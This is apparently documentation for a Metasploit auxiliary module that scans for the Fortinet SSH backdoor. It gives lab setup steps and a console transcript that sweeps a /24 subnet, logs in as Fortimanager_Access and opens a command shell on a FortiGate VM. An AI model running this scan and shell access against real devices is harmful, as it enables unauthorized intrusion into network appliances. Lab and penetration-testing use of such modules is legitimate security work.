## Intro

This module scans for the Fortinet SSH backdoor and creates sessions.

## Setup

1. `git clone https://github.com/nixawk/labs`
2. Import `FortiGate-Backdoor-VM/FortiGate-VM.ovf` into VMware
3. <http://help.fortinet.com/fweb/580/Content/FortiWeb/fortiweb-admin/network_settings.htm>

## Usage

```
msf5 > use auxiliary/scanner/ssh/fortinet_backdoor
msf5 auxiliary(scanner/ssh/fortinet_backdoor) > set rhosts 192.168.212.0/24
rhosts => 192.168.212.0/24
msf5 auxiliary(scanner/ssh/fortinet_backdoor) > set threads 100
threads => 100
msf5 auxiliary(scanner/ssh/fortinet_backdoor) > run

[*] Scanned  54 of 256 hosts (21% complete)
[+] 192.168.212.128:22 - Logged in as Fortimanager_Access
[*] Scanned  65 of 256 hosts (25% complete)
[*] Scanned  78 of 256 hosts (30% complete)
[*] Command shell session 1 opened (192.168.212.1:40605 -> 192.168.212.128:22) at 2018-02-21 21:35:11 -0600
[*] Scanned 104 of 256 hosts (40% complete)
[*] Scanned 141 of 256 hosts (55% complete)
[*] Scanned 154 of 256 hosts (60% complete)
[*] Scanned 180 of 256 hosts (70% complete)
[*] Scanned 205 of 256 hosts (80% complete)
[*] Scanned 240 of 256 hosts (93% complete)
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/fortinet_backdoor) > sessions -1
[*] Starting interaction with 1...

FortiGate-VM # get system status
Version: FortiGate-VM v5.0,build0228,130809 (GA Patch 4)
Virus-DB: 16.00560(2012-10-19 08:31)
Extended DB: 1.00000(2012-10-17 15:46)
Extreme DB: 1.00000(2012-10-17 15:47)
IPS-DB: 4.00345(2013-05-23 00:39)
IPS-ETDB: 0.00000(2000-00-00 00:00)
Serial-Number: FGVM00UNLICENSED
Botnet DB: 1.00000(2012-05-28 22:51)
License Status: Evaluation license expired
Evaluation License Expires: Thu Jan 28 13:05:41 2016
BIOS version: 04000002
Log hard disk: Need format
Hostname: FortiGate-VM
Operation Mode: NAT
Current virtual domain: root
Max number of virtual domains: 10
Virtual domains status: 1 in NAT mode, 0 in TP mode
Virtual domain configuration: disable
FIPS-CC mode: disable
Current HA mode: standalone
Branch point: 228
Release Version Information: GA Patch 4
System time: Wed Feb 21 13:13:43 2018

FortiGate-VM #
```
